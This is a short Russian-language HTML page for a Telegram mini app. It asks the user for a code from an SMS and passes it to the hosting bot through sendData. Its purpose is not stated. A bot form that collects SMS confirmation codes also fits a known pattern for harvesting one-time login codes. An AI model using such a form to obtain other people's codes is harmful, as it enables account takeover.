<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Код подтверждения</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="font-family: sans-serif; text-align: center; padding: 20px; background: #1c1c1e; color: #fff;">
    <h3>Введите код из SMS</h3>
    <input type="text" id="code" inputmode="numeric" maxlength="8" placeholder="12345"
           style="font-size: 22px; padding: 10px; width: 100%; box-sizing: border-box;">
    <br><br>
    <button id="submitBtn" onclick="sendCode()" style="font-size: 20px; padding: 12px 30px;">Подтвердить</button>

    <script>
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();

        async function sendCode() {
            const code = document.getElementById('code').value.trim();
            if (code.length < 4) {
                alert('Введите код (минимум 4 цифры)');
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.textContent = 'Отправка...';

            try {
                // Отправляем данные
                Telegram.WebApp.sendData(JSON.stringify({ code: code }));
                // Даём немного времени на отправку, но не закрываем сразу
                await new Promise(resolve => setTimeout(resolve, 300));
                // Закрываем окно
                Telegram.WebApp.close();
            } catch (e) {
                alert('Ошибка отправки: ' + e.message + '\n\nПопробуйте обновить страницу и ввести код заново.');
                btn.disabled = false;
                btn.textContent = 'Подтвердить';
            }
        }
    </script>
</body>
</html>
